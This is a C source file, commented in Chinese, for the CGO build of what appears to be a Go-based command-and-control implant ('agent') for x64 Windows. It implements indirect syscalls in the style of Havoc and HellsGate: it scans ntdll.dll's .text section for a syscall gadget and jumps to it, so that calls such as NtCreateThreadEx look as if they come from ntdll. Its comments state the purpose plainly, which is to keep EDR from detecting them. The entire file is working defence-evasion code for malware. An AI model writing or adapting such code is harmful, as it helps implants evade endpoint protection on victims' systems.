//go:build windows && amd64 && cgo

/*
 * indirect_syscall.c — CGO 间接 syscall stub for x64 Windows.
 * 参考 Havoc/HellsGate，使用 ntdll.dll 中的 syscall 指令 gadget，
 * 使 syscall 看起来来自 ntdll.dll 的合法代码页，而非 agent 内存。
 *
 * 关键技术：
 * 1. 扫描 ntdll.dll .text 段查找 0F 05 (syscall) 指令
 * 2. 使用 jmp 跳转到该 gadget，而非在 agent 内存中直接执行 syscall
 * 3. EDR 无法通过检查 syscall 指令来源检测异常
 *
 * 实现分工：
 * - indirect_syscall_asm (indirect_syscall_asm.S): 纯汇编，执行 jmp 到 gadget
 * - find_syscall_gadget / get_syscall_gadget (本文件): C 代码，PE 解析 + 扫描
 * - indirect_syscall (本文件): C 包装器，确保 gadget 初始化后调用 asm
 *
 * 编译要求: x86_64-w64-mingw32-gcc 或等价 MinGW-w64 工具链。
 * CGO 自动编译此文件和 indirect_syscall_asm.S，将其链接到最终的可执行文件中。
 */

#if defined(_WIN64) && defined(__GNUC__)

#include <windows.h>
#include "../crt/pe.h"

/* 全局缓存：syscall gadget 地址（延迟初始化） */
static unsigned long long g_syscall_gadget = 0;

/*
 * indirect_syscall_asm — 由 .S 文件提供的纯汇编间接 syscall 函数（4 参数以内）。
 * 参数: syscallNum, arg1, arg2, arg3, arg4
 * 内部设置 eax=SSN, r10=arg1, 从全局变量 syscall_gadget 取地址，然后 jmp。
 */
extern long long indirect_syscall_asm(
    unsigned int syscallNum,
    unsigned long long arg1,
    unsigned long long arg2,
    unsigned long long arg3,
    unsigned long long arg4
);

/*
 * indirect_syscall_do — 由 .S 文件提供的纯汇编间接 syscall 函数（最多 11 参数）。
 * 参数: syscallNum, arg1-arg11, gadget  (13 个参数)
 */
extern long long indirect_syscall_do(
    unsigned int syscallNum,
    unsigned long long arg1,
    unsigned long long arg2,
    unsigned long long arg3,
    unsigned long long arg4,
    unsigned long long arg5,
    unsigned long long arg6,
    unsigned long long arg7,
    unsigned long long arg8,
    unsigned long long arg9,
    unsigned long long arg10,
    unsigned long long arg11,
    unsigned long long gadget
);

/* 全局 gadget 地址（非 static，以便 asm 文件可以 .extern 引用） */
unsigned long long syscall_gadget = 0;

/* Forward declarations */
unsigned long long find_syscall_gadget(void);

/*
 * find_syscall_gadget — 扫描 ntdll.dll .text 段查找 syscall (0F 05) 指令。
 *
 * 步骤：
 * 1. GetModuleHandleW 获取已加载的 ntdll.dll 基址
 * 2. 解析 PE 头找到 .text 段的 RVA 和大小
 * 3. 逐字节扫描 .text 段，查找 0F 05 模式
 *
 * 返回：syscall 指令的绝对地址，失败返回 0。
 */
unsigned long long find_syscall_gadget(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        return 0;
    }

    unsigned char* base = (unsigned char*)ntdll;
    unsigned int textRVA, textSize;
    if (pe_find_section(base, ".text", &textRVA, &textSize) != 0) return 0;

    if (!textRVA || !textSize) {
        return 0;
    }

    /* 扫描 .text 段查找 0F 05 (syscall 指令) */
    unsigned char* textStart = base + textRVA;
    for (unsigned int i = 0; i < textSize - 1; i++) {
        if (textStart[i] == 0x0F && textStart[i + 1] == 0x05) {
            /* 验证：前一个字节不能是 0x0F（防止匹配到 0F 0F xx 等多字节指令内部）*/
            if (i > 0 && textStart[i - 1] == 0x0F) {
                continue;
            }
            return (unsigned long long)(textStart + i);
        }
    }

    return 0;
}

/*
 * get_syscall_gadget — Go 可调用的 gadget 地址获取/缓存函数。
 * 首次调用时扫描 ntdll，后续返回缓存值。
 */
unsigned long long get_syscall_gadget(void) {
    if (syscall_gadget == 0) {
        syscall_gadget = find_syscall_gadget();
    }
    return syscall_gadget;
}

/*
 * indirect_syscall_variadic — 支持可变参数（最多 10 个）的间接 syscall。
 *
 * Windows x64 调用约定:
 *   arg1 → rcx, arg2 → rdx, arg3 → r8, arg4 → r9
 *   arg5 → [rsp+0x20], arg6 → [rsp+0x28], ... arg10 → [rsp+0x48]
 *
 * 实现策略:
 *   - 4 个参数以内：直接调用 indirect_syscall_asm
 *   - 5+ 个参数：用内联汇编手动设置栈帧 + 寄存器，然后 jmp 到 gadget
 */
long long indirect_syscall_variadic(unsigned int syscallNum,
                                     int argc,
                                     unsigned long long* args) {
    /* 确保 gadget 已初始化 */
    if (syscall_gadget == 0) {
        syscall_gadget = find_syscall_gadget();
    }
    if (syscall_gadget == 0) {
        return -1;
    }

    unsigned long long a1 = 0, a2 = 0, a3 = 0, a4 = 0;
    if (argc > 0) a1 = args[0];
    if (argc > 1) a2 = args[1];
    if (argc > 2) a3 = args[2];
    if (argc > 3) a4 = args[3];

    if (argc <= 4) {
        return indirect_syscall_asm(syscallNum, a1, a2, a3, a4);
    }

    /* 5+ 参数：调用间接汇编函数，支持最多 11 个参数（满足 NtCreateThreadEx 等） */
    unsigned long long a5 = 0, a6 = 0, a7 = 0, a8 = 0, a9 = 0, a10 = 0, a11 = 0;
    if (argc > 4)  a5  = args[4];
    if (argc > 5)  a6  = args[5];
    if (argc > 6)  a7  = args[6];
    if (argc > 7)  a8  = args[7];
    if (argc > 8)  a9  = args[8];
    if (argc > 9)  a10 = args[9];
    if (argc > 10) a11 = args[10];

    unsigned long long gadget = syscall_gadget;
    return indirect_syscall_do(syscallNum, a1, a2, a3, a4,
                               a5, a6, a7, a8, a9, a10, a11, gadget);
}

#else

/* 非 Windows x64 平台 stub */
unsigned long long syscall_gadget = 0;
unsigned long long find_syscall_gadget(void) { return 0; }
unsigned long long get_syscall_gadget(void) { return syscall_gadget; }

long long indirect_syscall_variadic(unsigned int syscallNum,
                                     int argc,
                                     unsigned long long* args) {
    (void)syscallNum; (void)argc; (void)args;
    return -1;
}

#endif
